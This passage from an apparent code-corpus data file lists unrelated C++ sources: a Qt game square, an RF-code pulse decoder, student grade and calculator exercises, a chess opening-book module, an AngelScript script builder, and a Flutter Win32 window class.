QGraphicsItem::mouseReleaseEvent(event);\n}\n\nvoid BoardSquare::OnReceiveOrders(int n, int m, int doThis)\n{\n    if (n == nArray && m == mArray)\n    {\n        setEnabled(false);\n        doAction = doThis;\n        update();\n    }\n}\n",
    "// Used demodulation code from https://triq.org/\n#include <algorithm>\n#include <cctype>\n#include <cstring>\n#include <iostream>\n#include <string>\n#include <vector>\n#include <fstream>\n#include <sstream>\nusing namespace std;\n\nclass S {\npublic:\n  S(string t = \"\") { fromString(t); }\n\n  void fromString(string t) {\n    t.erase(std::remove_if(t.begin(), t.end(), ::isspace), t.end());\n    line = t;\n    index = 0;\n  }\n\n  bool hasNibble() { return index + 1 <= line.length(); }\n\n  bool hasByte() { return index + 2 <= line.length(); }\n\n  bool hasWord() { return index + 4 <= line.length(); }\n\n  int peekNibble() { return std::stoi(line.substr(index, 1), nullptr, 16); }\n\n  int peekByte() { return std::stoi(line.substr(index, 2), nullptr, 16); }\n\n  int peekWord() { return std::stoi(line.substr(index, 4), nullptr, 16); }\n\n  int getNibble() {\n    int t = std::stoi(line.substr(index, 1), nullptr, 16);\n    index += 1;\n    return t;\n  }\n\n  int getByte() {\n    int t = std::stoi(line.substr(index, 2), nullptr, 16);\n    index += 2;\n    return t;\n  }\n\n  int getWord() {\n    int t = std::stoi(line.substr(index, 4), nullptr, 16);\n    index += 4;\n    return t;\n  }\n\n  void pushNibble(int t) { line += std::to_string(t); }\n\n  void pushByte(int t) { line += std::to_string(t); }\n\n  void pushWord(int t) { line += std::to_string(t); }\n  int getIndex() { return index; }\n  void setIndex(int idx) { index = idx; }\n\nprivate:\n  string line;\n  int index;\n};\n\nint getSizeCode(string data) {\n  S e(data);\n  if (e.getByte() != 0xAA) {\n    cout << \"Invalid header\" << endl;\n    return 0;\n  }\n\n  int n = e.getByte();\n  int l, a, o;\n  cout << \"n: \" << n << endl;\n  if (n == 0xB1) {\n    a = e.getByte();\n    // we need to set repetitions to 1\n    o = 1;\n  } else if (n == 0xB0) {\n    l = e.getByte();\n    a = e.getByte();\n    o = e.getByte();\n  } else {\n    cout << \"Invalid header\" << endl;\n    return 0;\n  }\n\n  int r[a];\n  for (int g = 0; g < a; ++g)\n    r[g] = e.getWord();\n\n  bool c = false;\n  int f = e.getIndex();\n  while (e.hasNibble()) {\n    if (e.getNibble() > 7) {\n      c = true;\n      break;\n    }\n  }\n  e.setIndex(f);\n  int size = 0;\n  while (e.hasNibble() && e.peekByte() != 0x55) {\n    int g = e.getNibble();\n    size++;\n  }\n  cout << \"Size inside: \" << size << endl;\n  return size * o;\n}\nint *getCodePulses(string t, int *s) {\n  S e(t);\n  S e_copy(t);\n\n  if (e.getByte() != 0xAA) {\n    return s;\n  }\n\n  int n = e.getByte();\n  int l, a, o;\n  if (n == 0xB1)\n    a = e.getByte();\n  else if (n == 0xB0) {\n    l = e.getByte();\n    a = e.getByte();\n    o = e.getByte();\n  } else {\n    return s;\n  }\n\n  int r[a];\n  for (int g = 0; g < a; ++g)\n    r[g] = e.getWord();\n\n  bool c = false;\n  int f = e.getIndex();\n  while (e.hasNibble()) {\n    if (e.getNibble() > 7) {\n      c = true;\n      break;\n    }\n  }\n  e.setIndex(f);\n  if (!c) {\n    s[0] = 0;\n    int i = 1;\n    while (e.hasNibble() && e.peekByte() != 0x55) {\n      int g = e.getNibble();\n      if (g > a)\n        break;\n      s[i++] = r[g];\n    }\n    s[i++] = 0;\n    if (o) {\n      int repeats = o;\n      for (int j = 0; j < repeats; j++) {\n        for (int k = 0; k < i; k++) {\n          s[i * j + k] = s[k];\n        }\n      }\n    }\n    return s;\n  }\n\n  bool d = true;\n  int i = 0;\n  while (e.hasNibble() && e.peekByte() != 0x55) {\n    int g = e.getNibble();\n    int b = g & 7;\n    if (b > a)\n      break;\n    if (g & 8) {\n      if (!d)\n        s[i++] = 0;\n      s[i++] = r[b];\n      d = false;\n    } else {\n      if (d)\n        s[i++] = 0;\n      s[i++] = r[b];\n      d = true;\n    }\n  }\n\n  if (!d)\n    s[i++] = 0;\n\n  if (o) {\n    int repeats = o;\n    for (int j = 0; j < repeats; j++) {\n      for (int k = 0; k < i; k++) {\n        s[i * j + k] = s[k];\n      }\n    }\n  }\n  return s;\n}\n\nint main(int argc, char *argv[]) {\n  if (argc < 1) {\n    cout << \"Usage: \" << argv[0] << \" \\\"AA...\\\"\" << endl;\n    return 1;\n  }\n  vector<int> pulses;\n  for (int i = 1; i < argc; i++) {\n    string data = argv[i];\n    // split string by +\n    char *p = strtok((char *)data.c_str(), \"+\");\n    while (p != NULL) {\n      int size = getSizeCode(p);\n      int s[size];\n      getCodePulses(p, s);\n      cout << \"Size: \" << size << endl;\n      cout << \"Pulses: \";\n      for (int j = 0; j < size; j++) {\n        pulses.push_back(s[j]);\n        cout << s[j] << \" \";\n      }\n      cout << endl;\n      p = strtok(NULL, \"+\");\n    }\n    for (auto i : pulses) {\n      cout << i << \" \";\n    }\n    cout << endl;\n  }\n\n  // open header file and override content\n  ofstream pulse_file;\n  pulse_file.open(\"../pulse.h\", ios::out);\n  if(!pulse_file.is_open()){\n\t\t  cout << \"Unable to open file\" << endl;\n  }\n  // vector into string seperated by comma \n  std::stringstream ss;\n  for(int i = 0; i < pulses.size() ; i++){\n\t\t  // stop before the last element\n\t\t  ss << pulses.at(i);\n\t\t  if(i < pulses.size()-1){\n\t\t     ss << \",\";\n\t\t  }\n\n  }\n  pulse_file << \"const int pulses[] = {\" << ss.str() << \"};\" ;\n  pulse_file.close();\n}\n",
    "#include<iostream>\n#include<iomanip>\nusing namespace std;\nclass Diem{\n    float a[100];\n    int n;\n    public:\n        void setn(int _n){\n            n=_n;\n        }\n        int getn(){\n            return n;\n        }\n        float &operator [](int i){\n            return a[i];\n        }\n        ///\n        Diem(int _n=0,float _a[]=new float{0}){\n            n=_n;\n            for (int i=0;i<n;i++){\n                a[i]=_a[i];\n            }\n        }\n        Diem(const Diem &m){\n            n=m.n;\n            for (int i=0;i<m.n;i++){\n                a[i]=m.a[i];\n            }\n        }\n        ~Diem(){}\n        //////\n        friend istream& operator >>(istream& is,Diem &a){\n            a.n=0;\n            while(is>>a[a.n]) a.n++;\n            return is;\n        }\n        friend ostream& operator <<(ostream& os,Diem a){\n            for(int i=0;i<a.n;i++){\n                os<<a.a[i];\n            }\n            return os;\n        }\n        float dtb(){\n            float tong=0;\n            for(int i=0;i<n;i++){\n                tong+=a[i];\n            }\n            return tong/n;\n        }\n};          \nclass SinhVien{\n    string Hoten,maSV;\n    Diem d;\n    public:\n        void setname(string s){\n            Hoten=s;\n        }\n        string getname(){\n            return Hoten;\n        }\n        void setmasv(string s){\n            maSV=s;\n        }\n        string getmasv(){\n            return maSV;\n        }\n        void setDiem(Diem _d){\n            d=_d;\n        }\n        Diem getDiem(){\n            return d;\n        }\n        /////\n        SinhVien(string a=\"hoten\",string b=\"masv\",Diem _d=Diem()){\n            Hoten=a;\n            maSV=b;\n            d=_d;\n        }\n        SinhVien(const SinhVien &a){\n            Hoten=a.Hoten;\n            maSV=a.maSV;\n            d=a.d;\n        }\n        ~SinhVien(){}\n        //////\n        friend istream& operator >>(istream& is,SinhVien &a){\n            getline(is,a.Hoten);\n            is.ignore();\n            getline(is,a.maSV);\n            is>>a.d;\n            is.clear();\n            return is;\n        }\n        friend ostream& operator <<(ostream& os,SinhVien a){\n            os<<a.Hoten<<endl;\n            os<<a.maSV<<endl;\n            os<<fixed<<setprecision(2)<<a.getDiem().dtb();\n            return os;\n        }\n        bool operator <(SinhVien a){\n            return d.dtb()<a.d.dtb();\n        }\n\n};\n\n\nint main(){\n    SinhVien a;\n    cin>>a;\n    cout<<a;\n    return 0;\n}",
    "#include \"cgpa_calc_2.0.h\"\n#include \"john_cpga_calc_2.0.h\"\n#include <iostream>\n#include <string>\n#include <limits>\n#include <memory>\n\ntemplate <typename T>\n  T getInput(const std::string& prompt){\n      T value;\n      std::cout<<prompt;\n      while(!(std::cin>>value)){\n          std::cin.clear();\n         std::cin.ignore(std::numeric_limits<std::streamsize>::max(),'\\n');\n          std::cerr<<\"Invalid input, try again.\"<<std::endl;\n      }\n      return value;\n  }\n  \ntemplate <>\n  std::string getInput<std::string>(const std::string& prompt){\n      std::string value;\n      std::cout<<prompt;\n      getline(std::cin,value);\n      return value;\n  }\n   \nint main(){\n    \n    int EE401 = getInput<int>(\"Enter the grade for EEE401: \");\n    while(EE401 < 0 || EE401 > 100){\n         std::cout<<\"Invalid input, try again.\"<<std::endl;\n         EE401 = getInput<int>(\"Enter the grade for EEE401: \");\n    }\n    \n    \n    int EE402 = getInput<int>(\"Enter the grade for EEE402: \");\n    while(EE402 < 0 || EE402 > 100){\n         std::cout<<\"Invalid input, try again.\"<<std::endl;\n         EE402 = getInput<int>(\"Enter the grade for EEE401: \");\n    }\n    \n    \n    int EE403 = getInput<int>(\"Enter the grade for EEE403: \");\n    while(EE403 < 0 || EE403 > 100){\n         std::cout<<\"Invalid input, try again.\"<<std::endl;\n         EE403 = getInput<int>(\"Enter the grade for EEE401: \");\n    }\n    \n    \n    int EE404 = getInput<int>(\"Enter the grade for EEE404: \");\n    while(EE404 < 0 || EE404 > 100){\n         std::cout<<\"Invalid input, try again.\"<<std::endl;\n         EE404 = getInput<int>(\"Enter the grade for EEE401: \");\n    }\n    \n\n    std::unique_ptr<John> student = std::make_unique<John>(\"John\", EE401, EE402, EE403, EE404, ' ', ' ', ' ', ' ');\n    \n    // Call the display method to print student information and grades\n    student->display();            \n       \n}",
    "// Online C++ compiler to run C++ program online\r\n#include <iostream>\r\n\r\nint main() {\r\n    char op;\r\n    float num1, num2;\r\n    for(int run = 0; run != 1;){\r\n        std::cout << \"Enter operator (+, -, *, /): \";\r\n        std::cin >> op;\r\n    \r\n        std::cout << \"Enter two numbers: \";\r\n        std::cin >> num1 >> num2;\r\n    \r\n        switch(op) {\r\n            case '+':\r\n                std::cout << num1 << \" + \" << num2 << \" = \" << num1 + num2 << std::endl;\r\n                break;\r\n            case '-':\r\n                std::cout << num1 << \" - \" << num2 << \" = \" << num1 - num2 << std::endl;\r\n                break;\r\n            case '*':\r\n                std::cout << num1 << \" * \" << num2 << \" = \" << num1 * num2 << std::endl;\r\n                break;\r\n            case '/':\r\n                if(num2 != 0)\r\n                    std::cout << num1 << \" / \" << num2 << \" = \" << num1 / num2 << std::endl;\r\n                else\r\n                    std::cout << \"Error! Division by zero!\" << std::endl;\r\n                break;\r\n            default:\r\n                std::cout << \"Error! Invalid operator!\" << std::endl;\r\n        }\r\n    }\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nvoid somando();\nint fibonacci(int n);\nint busca();\nstring inverte();\n\nint main() {\n\tsomando(); //Q01\n\tcout << endl;\n\tbusca(); //Q02\n\tcout << endl;\n\tinverte(); //Q05\n\n\treturn 0;\n}\n\n\n// Questao 01\nvoid somando() {\n\tint i = 13, k = 0, s = 0;\n\twhile (k < i) {\n\t\tk += 1;\n\t\ts += k;\n\t}\n\tcout << \"O resultado da soma e: \" << s << endl;\n}\n\n// Questao 02\nint fibonacci(int n) {\n\tif (n <= 1)\n\t\treturn n;\n\telse\n\t\treturn fibonacci(n - 1) + fibonacci(n - 2);\n}\n\nint busca() {\n\tvector<int> fib;\n\tint indice_encontrado = -1;\n\tint procurado;\n\n\tcout << \"Digite o numero a ser buscado: \";\n\tcin >> procurado;\n\n\tfor (int i = 0; i < 20; i++) {\n\t\tfib.push_back(fibonacci(i));\n\t\tif (fib[i] == procurado) {\n\t\t\tindice_encontrado = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (indice_encontrado != -1) {\n\t\tcout << \"Numero encontrado na sequencia na posicao \" << indice_encontrado << endl;\n\t}\n\telse {\n\t\tcout << \"Numero nao encontrado na sequencia\" << endl;\n\t}\n\n\treturn indice_encontrado;\n}\n\n// Questao 05\nstring inverte() {\n\tstring entrada, saida;\n\tcout << \"Insira a string que sera invertida: \";\n\tcin >> entrada;\n\tfor (int i = entrada.size(); i >= 0; i--) {\n\t\tsaida += entrada[i];\n\t}\n\tcout << \"A string invertida e: \" <<  saida << endl;\n\treturn saida;\n}\n",
    "#include \"node_4.h\"\n\n#include <iostream>\n\nnamespace tng_v1 {\n\nNode4::Node4() {\n    std::cout << \"Node4::Node4 ...\" << std::endl;\n    m_dataCenterOutput = m_outputDataCenter.get_future().share();\n}\n\nvoid Node4::run() {\n    std::cout << \"Node4::run ...\" << std::endl;\n\n    for (const auto& dci : m_dataCenterInput) {\n        if (dci.valid()) {\n            dci.wait();\n        }\n    }\n\n    if (m_dataCenterInput.size() > 0) {\n        std::shared_ptr<DataCenter> dataCenter = m_dataCenterInput[0].get();\n\n        if (dataCenter->node4OutputData == nullptr) {\n            dataCenter->node4OutputData = std::shared_ptr<Node4OutputData>(new Node4OutputData);\n        }\n\n        std::shared_ptr<Node2OutputData> inputData2 = dataCenter->node2OutputData;\n        if (inputData2) {\n            dataCenter->node4OutputData->f += inputData2->c + 10;\n            std::cout << \"Node4 f: \" << dataCenter->node4OutputData->f\n                        << \" | c: \" << inputData2->c << std::endl;\n        }\n\n        std::shared_ptr<Node3OutputData> inputData3 = dataCenter->node3OutputData;\n        if (inputData3) {\n            dataCenter->node4OutputData->f += inputData3->d + inputData3->e + 100;\n            std::cout << \"Node4 f: \" << dataCenter->node4OutputData->f\n                        << \" | d: \" << inputData3->d\n                        << \" e: \" << inputData3->e << std::endl;\n        }\n\n        m_outputDataCenter.set_value(dataCenter);\n    }\n}\n\n}  // namespace tng_v1",
    "//book.cpp.  Copyright (C) 2004 Dan Honeycutt.  You are free\r\n//to use this software.  There is no warranty of any kind.\r\n#include <stdlib.h>\r\n#include \"book.h\"\r\n\r\n//CBook seeds the random number generator.  Change the following\r\n//to 0 (or call srand(1) after startup) if you want fixed random\r\n//numbers for debugging etc.  Of course if you do this the moves\r\n//selected from the book won't be random.\r\n#define seed_random_number_generator 1\r\n\r\n#if seed_random_number_generator\r\n#include <time.h>\r\n#endif\r\n\r\n//default book - follows below.\r\nextern CBookDef bk_def_book[];\r\n\r\n//====================================================================\r\n//GetBookMove() returns a book move for the current position.\r\n//Calls SelectBookMove() which chooses the move.\r\n//====================================================================\r\nconst char *CBook::GetBookMove(const CBookPos *cur_pos) {\r\n  const char *promote = \"  NBRQ\";\r\n  static char buffer[6];\r\n  int i, move;\r\n  char *pc = buffer;\r\n  if ((move = SelectBookMove(cur_pos))) {\r\n    //book move available - format to ascii\r\n    for (i = 0; i < 2; i++) {\r\n      *pc++ = (char) ('a' + (move & 7));\r\n      *pc++ = (char) ('1' + ((move & 63) >> 3));\r\n      move >>= 6;\r\n    }\r\n    i = move & 7;\r\n    if ((i > 1) && (i < 6)) *pc++ = promote[i];\r\n  }\r\n  *pc = 0;\r\n  return buffer;\r\n} //GetBookMove()\r\n\r\n//====================================================================\r\n//SelectBookMove() makes the random selection of a move according to\r\n//move weight.  Calls FindBookEntry() to get moves to select from.\r\n//====================================================================\r\nint CBook::SelectBookMove(const CBookPos *cur_pos) {\r\n  int i, k = 0;\r\n  char c;\r\n  //do a quick validity check and piece count\r\n  for (i = 0; i < 64; i++) {  \r\n    c = cur_pos->bk_board[i];\r\n    if (c) {\r\n      k++;\r\n      if ((c < 0) || (c > 15)) return 0;\r\n    }\r\n  }\r\n  if (k < bk_min_men) return 0;             //too few pieces\r\n  if (!FindBookEntry(cur_pos)) return 0;    //position not found\r\n  if (bk_num_moves == 0) return 0;          //position has no moves\r\n\r\n  k = 0;\r\n  c = (char) (rand() % 100);                //0 to 99\r\n  for (i = 0; i < bk_num_moves; i++) {\r\n    k += bk_entry.bk_value[i];\r\n    if (k > c) return (bk_entry.bk_moves[i]);\r\n  }  \r\n  return (0);   //no move\r\n} //SelectBookMove()\r\n\r\n//====================================================================\r\n//FindBookEntry() looks for the current position in the book.  Returns \r\n//true if the position is found and member variable bk_entry will have \r\n//the moves.  Looks first for the current position and, if not found,\r\n//looks again for the position with colors reversed.\r\n//Calls BinSearch() to perform the actual search.\r\n//====================================================================\r\nbool CBook::FindBookEntry(const CBookPos *cur_pos) {\r\n  int i, move, b1, b2, pro;\r\n  char c;\r\n  CBookPos temp;\r\n\r\n  bk_num_moves = 0;\r\n  bk_color_rev = 0;\r\n  if ((i = BinSearch(GetHashKey(cur_pos)))) {\r\n    CopyBookEntry(i);\r\n    return 1;\r\n  }\r\n  //failed to find position, reverse colors and try again\r\n  for (i = 0; i < 64; i++) {\r\n    c = cur_pos->bk_board[i];\r\n    if (c) c ^= 8;                    //toggle piece color\r\n    temp.bk_board[Flip(i)] = c;      //flip square\r\n  }\r\n  c = cur_pos->bk_ep_target;\r\n  if ((c < 16) || (c > 47)) c = 0;\r\n  if (c) c = (char) Flip(c);\r\n  temp.bk_ep_target = c;\r\n  temp.bk_color = !cur_pos->bk_color;\r\n  i = BinSearch(GetHashKey(&temp));\r\n  if (!i) return 0;\r\n  //found the color reverse position. moves have to be reversed\r\n  bk_color_rev = 1;\r\n  CopyBookEntry(i);\r\n  for (i = 0; i < bk_num_moves; i++) {\r\n    move = bk_entry.bk_moves[i];\r\n    b1 = Flip(move & 63);\r\n    b2 = Flip((move >> 6) & 63);\r\n    pro = (move >> 12) & 7;\r\n    bk_entry.bk_moves[i] = (short)(b1 + (b2 << 6) + (pro << 12));\r\n  }\r\n  return 1;\r\n} //FindBookEntry()\r\n\r\n//====================================================================\r\n//BinSearch() performs search for target position.  Since the keys \r\n//are random, the value of target tells approximately where it\r\n//resides in the list.  BinSearch() finds a window around target then\r\n//performs a binary search of the window.\r\n//====================================================================\r\nint CBook::BinSearch(bk_bbd target) {\r\n  int lo, mid, hi;\r\n  bk_bbd key;\r\n\r\n  //set a window around the calculated position of target\r\n  mid = 1 + (bk_num_pos >> 8);  //window ~ 0.5% of total positions\r\n  hi = (int) (target >> 33);    //whittle down to signed 4 byte size\r\n  hi = mid + (int) (bk_num_pos * (((float)hi)/2147483647.0f));  \r\n  if (hi > bk_num_pos) hi = bk_num_pos;\r\n  lo = hi - 2 * mid;\r\n  if (lo < 1) lo = 1;\r\n  //adjust window if we missed the target\r\n  while (BookEntryKey(lo) > target) {   //window too high\r\n    hi = lo;          //move hi down to lo\r\n    mid *= 2;         //expand window size\r\n    lo -= mid;        //move lo down by window size\r\n    if (lo < 1) {     //check limits\r\n      lo",
    "#include \"scriptbuilder.h\"\n#include <vector>\n#include <assert.h>\nusing namespace std;\n\n#include <stdio.h>\n#if defined(_MSC_VER) && !defined(_WIN32_WCE) && !defined(__S3E__)\n#include <direct.h>\n#endif\n#ifdef _WIN32_WCE\n#include <windows.h> // For GetModuleFileName()\n#endif\n\n#if defined(__S3E__) || defined(__APPLE__) || defined(__GNUC__)\n#include <unistd.h> // For getcwd()\n#endif\n\nBEGIN_AS_NAMESPACE\n\n// Helper functions\nstatic string GetCurrentDir();\nstatic string GetAbsolutePath(const string &path);\n\n\nCScriptBuilder::CScriptBuilder()\n{\n\tengine = 0;\n\tmodule = 0;\n\n\tincludeCallback = 0;\n\tincludeParam = 0;\n\n\tpragmaCallback = 0;\n\tpragmaParam = 0;\n}\n\nvoid CScriptBuilder::SetIncludeCallback(INCLUDECALLBACK_t callback, void *userParam)\n{\n\tincludeCallback = callback;\n\tincludeParam   = userParam;\n}\n\nvoid CScriptBuilder::SetPragmaCallback(PRAGMACALLBACK_t callback, void *userParam)\n{\n\tpragmaCallback = callback;\n\tpragmaParam = userParam;\n}\n\nint CScriptBuilder::StartNewModule(asIScriptEngine *inEngine, const char *moduleName)\n{\n\tif(inEngine == 0 ) return -1;\n\n\tengine = inEngine;\n\tmodule = inEngine->GetModule(moduleName, asGM_ALWAYS_CREATE);\n\tif( module == 0 )\n\t\treturn -1;\n\n\tClearAll();\n\n\treturn 0;\n}\n\nasIScriptEngine *CScriptBuilder::GetEngine()\n{\n\treturn engine;\n}\n\nasIScriptModule *CScriptBuilder::GetModule()\n{\n\treturn module;\n}\n\nunsigned int CScriptBuilder::GetSectionCount() const\n{\n\treturn (unsigned int)(includedScripts.size());\n}\n\nstring CScriptBuilder::GetSectionName(unsigned int idx) const\n{\n\tif( idx >= includedScripts.size() ) return \"\";\n\n#ifdef _WIN32\n\tset<string, ci_less>::const_iterator it = includedScripts.begin();\n#else\n\tset<string>::const_iterator it = includedScripts.begin();\n#endif\n\twhile( idx-- > 0 ) it++;\n\treturn *it;\n}\n\n// Returns 1 if the section was included\n// Returns 0 if the section was not included because it had already been included before\n// Returns <0 if there was an error\nint CScriptBuilder::AddSectionFromFile(const char *filename)\n{\n\t// The file name stored in the set should be the fully resolved name because\n\t// it is possible to name the same file in multiple ways using relative paths.\n\tstring fullpath = GetAbsolutePath(filename);\n\n\tif( IncludeIfNotAlreadyIncluded(fullpath.c_str()) )\n\t{\n\t\tint r = LoadScriptSection(fullpath.c_str());\n\t\tif( r < 0 )\n\t\t\treturn r;\n\t\telse\n\t\t\treturn 1;\n\t}\n\n\treturn 0;\n}\n\n// Returns 1 if the section was included\n// Returns 0 if the section was not included because it had already been included before\n// Returns <0 if there was an error\nint CScriptBuilder::AddSectionFromMemory(const char *sectionName, const char *scriptCode, unsigned int scriptLength, int lineOffset)\n{\n\tif( IncludeIfNotAlreadyIncluded(sectionName) )\n\t{\n\t\tint r = ProcessScriptSection(scriptCode, scriptLength, sectionName, lineOffset);\n\t\tif( r < 0 )\n\t\t\treturn r;\n\t\telse\n\t\t\treturn 1;\n\t}\n\n\treturn 0;\n}\n\nint CScriptBuilder::BuildModule()\n{\n\treturn Build();\n}\n\nvoid CScriptBuilder::DefineWord(const char *word)\n{\n\tstring sword = word;\n\tif( definedWords.find(sword) == definedWords.end() )\n\t{\n\t\tdefinedWords.insert(sword);\n\t}\n}\n\nvoid CScriptBuilder::ClearAll()\n{\n\tincludedScripts.clear();\n\n#if AS_PROCESS_METADATA == 1\n\tcurrentClass = \"\";\n\tcurrentNamespace = \"\";\n\n\tfoundDeclarations.clear();\n\ttypeMetadataMap.clear();\n\tfuncMetadataMap.clear();\n\tvarMetadataMap.clear();\n#endif\n}\n\nbool CScriptBuilder::IncludeIfNotAlreadyIncluded(const char *filename)\n{\n\tstring scriptFile = filename;\n\tif( includedScripts.find(scriptFile) != includedScripts.end() )\n\t{\n\t\t// Already included\n\t\treturn false;\n\t}\n\n\t// Add the file to the set of included sections\n\tincludedScripts.insert(scriptFile);\n\n\treturn true;\n}\n\nint CScriptBuilder::LoadScriptSection(const char *filename)\n{\n\t// Open the script file\n\tstring scriptFile = filename;\n#if _MSC_VER >= 1500 && !defined(__S3E__)\n\tFILE *f = 0;\n\tfopen_s(&f, scriptFile.c_str(), \"rb\");\n#else\n\tFILE *f = fopen(scriptFile.c_str(), \"rb\");\n#endif\n\tif( f == 0 )\n\t{\n\t\t// Write a message to the engine's message callback\n\t\tstring msg = \"Failed to open script file '\" + GetAbsolutePath(scriptFile) + \"'\";\n\t\tengine->WriteMessage(filename, 0, 0, asMSGTYPE_ERROR, msg.c_str());\n\n\t\t// TODO: Write the file where this one was included from\n\n\t\treturn -1;\n\t}\n\n\t// Determine size of the file\n\tfseek(f, 0, SEEK_END);\n\tint len = ftell(f);\n\tfseek(f, 0, SEEK_SET);\n\n\t// On Win32 it is possible to do the following instead\n\t// int len = _filelength(_fileno(f));\n\n\t// Read the entire file\n\tstring code;\n\tsize_t c = 0;\n\tif( len > 0 )\n\t{\n\t\tcode.resize(len);\n\t\tc = fread(&code[0], len, 1, f);\n\t}\n\n\tfclose(f);\n\n\tif( c == 0 && len > 0 )\n\t{\n\t\t// Write a message to the engine's message callback\n\t\tstring msg = \"Failed to load script file '\" + GetAbsolutePath(scriptFile) + \"'\";\n\t\tengine->WriteMessage(filename, 0, 0, asMSGTYPE_ERROR, msg.c_str());\n\t\treturn -1;\n\t}\n\n\t// Process the script section even if it is zero length so that the name is registered\n\treturn ProcessScriptSection(code.c_str(), (unsigned int)(code.length()), filename, 0);\n}\n\nint CScrip",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
